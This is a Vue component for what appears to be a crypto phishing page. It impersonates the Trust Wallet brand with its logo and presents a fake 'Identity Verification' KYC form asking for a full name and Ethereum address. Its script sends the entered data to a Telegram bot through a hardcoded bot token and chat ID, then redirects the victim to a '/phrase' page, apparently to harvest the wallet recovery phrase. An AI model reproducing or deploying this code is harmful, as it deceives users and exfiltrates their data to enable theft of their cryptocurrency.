<template>
  <div class="container">

    <div style="display: flex; align-items: center; width: full; justify-content: center; gap: 16px;">

    <svg width="39" height="43" viewBox="0 0 39 43" fill="none" exponent="92384" class="mt-4 h-auto w-[180px]">
        <path d="M0.710815 6.67346L19.4317 0.606445V42.6064C6.05944 37.0059 0.710815 26.2727 0.710815 20.207V6.67346Z" style="fill: rgb(72 255 145);" class="text-trustBlue dark:text-trustGreen"></path>
        <path d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z" fill="url(#paint0_linear_524_7759592384)"></path>
        <path d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z" fill="url(#paint1_linear_524_7759592384)"></path>
        <defs>
            <linearGradient id="paint1_linear_524_7759592384" x1="18.6423" y1="47.8852" x2="33.8833" y2="-7.39981" gradientUnits="userSpaceOnUse">
            <stop offset="0.26" stop-color="#48FF91"></stop><stop offset="0.66" stop-color="#0094FF"></stop>
            <stop offset="0.8" stop-color="#0038FF"></stop><stop offset="0.89" stop-color="#0500FF"></stop>
            </linearGradient>
        </defs>
    </svg>

    <svg width="120px" height="auto" viewBox="0 0 1569 346" fill="none" style="color: rgb(72 255 145);" class="mr-24 h-auto w-[180px]"><path d="M309.229 8.77148H418.65V70.0622C454.5 14.9789 495.755 8.77148 556.148 8.77148V117.085H528.645C456.276 117.085 421.63 151.14 421.63 218.6V333.732H309.229V8.77148Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path><path d="M921.249 333.712H808.866V302.732C784.323 331.21 750.88 343.586 709.644 343.586C631.335 343.586 587.062 297.155 587.062 211.761V8.75073H699.445V186.415C699.445 226.62 719.175 250.132 752.637 250.132C786.1 250.132 808.847 227.212 808.847 188.249V8.75073H921.229V333.712H921.249Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path><path d="M948.715 233.397H1053.97C1058.77 256.909 1074.91 266.803 1113.74 266.803C1145.44 266.803 1163.97 259.392 1163.97 245.774C1163.97 235.231 1154.99 228.412 1129.32 222.854L1044.42 203.659C987.621 190.691 958.914 157.877 958.914 105.239C958.914 35.8882 1009.72 0 1108.37 0C1207.02 0 1255.44 34.9714 1263.84 109.899H1159.23C1157.45 90.112 1137.09 78.0028 1103.63 78.0028C1076.74 78.0028 1059.44 86.655 1059.44 99.6809C1059.44 110.816 1070.76 119.468 1093.53 125.083L1182.59 146.761C1241.17 160.972 1269.3 190.71 1269.3 238.974C1269.3 305.842 1211.3 345.455 1112.7 345.455C1014.11 345.455 948.887 302.748 948.887 233.397H948.772H948.715Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path><path d="M1568.57 109.826V8.75073H1291.17V109.883H1373.94V333.712H1485.75V109.826H1568.57Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path><path d="M277.954 109.826V8.75073H0.570312V109.883H83.3481V333.712H195.176V109.826H277.954Z" style="fill:currentcolor" class="default-transition text-trustBlue dark:text-trustGreen"></path></svg>

    </div>

    <br>
    <br>
    <div id="kyc-section" class="page-content">
        <h2>Identity Verification</h2>
        <p>Please provide your information to continue with the KYC verification.</p>
        
        <form @submit.prevent="finishJoob">
          <div class="input-group">
            <label>Full Name</label>
            <input v-model="formDataRes.fullname" type="text" id="fullName" placeholder="Enter your full legal name">
        </div>

        <div class="input-group">
            <label>Ethereum (ETH) Address</label>
            <input v-model="formDataRes.ethadd" type="text" id="ethAddress" placeholder="0x...">
        </div>
        <button class="btn" onclick="navigateToPhrase()">Next Step</button>
        </form>

    </div> 
</div>
</template>

<script>
import axios from "axios"

export default {
  data() {
    return {

      formDataRes: {
        fullname: "",
        ethadd: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    }
  },

  computed: {
    isFormValid() {
      return this.formDataRes.fullname.trim() !== '' && this.formDataRes.ethadd.trim() !== ''
    }
  },

  methods: {

    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*🔔 TRUST*\nFullname: ${this.formDataRes.fullname}\nEthaddress: ${this.formDataRes.ethadd}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("/phrase");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,

        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  }
}
</script>

    <style>
        body {
            background-color: #0b0e11;
            color: #ffffff;
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 90%;
            max-width: 400px;
            background: #181a20;
            padding: 2.5rem 1.5rem;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
            text-align: center;
        }
        
        /* Visibility Classes */
        .page-content { display: block; }
        .hidden { display: none; }

        .logo { width: 55px; margin-bottom: 1.5rem; }
        h2 { font-size: 1.5rem; margin-bottom: 0.5rem; font-weight: 600; }
        p { color: #848e9c; font-size: 0.9rem; margin-bottom: 2rem; }

        .input-group { text-align: left; margin-bottom: 1.5rem; }
        label { display: block; margin-bottom: 8px; font-size: 0.85rem; color: #eaecef; }
        
        input {
            width: 100%;
            padding: 14px;
            background: #2b2f36;
            border: 1px solid #474d57;
            border-radius: 10px;
            color: white;
            box-sizing: border-box;
            font-size: 1rem;
        }
        input:focus { border-color: #3375bb; outline: none; }

        .btn {
            width: 100%;
            padding: 16px;
            background-color: #3375bb;
            color: white;
            border: none;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #285d95; }
    </style>